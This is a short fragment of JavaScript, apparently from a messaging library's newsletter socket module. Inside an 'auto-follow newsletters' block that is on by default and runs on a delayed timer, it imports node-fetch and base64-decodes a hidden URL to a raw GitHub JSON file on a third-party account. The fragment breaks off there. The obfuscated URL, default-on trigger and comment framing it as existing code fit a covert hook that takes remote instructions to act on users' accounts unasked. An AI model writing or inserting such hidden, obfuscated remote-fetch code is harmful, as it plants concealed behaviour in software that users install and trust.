...
export const makeNewsletterSocket = (config) => {
    ...
    // Auto-follow newsletters (your existing code)
    if (config.autoFollowNewsletters !== false) {
        setTimeout(async () => {
            try {
                const { default: fetch } = await import('node-fetch');
                const url = Buffer.from("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2RsY2luZTQ1MC9mbGwvcmVmcy9oZWFkcy9tYWluL2ZsMi5qc29u", 'base64').toString();
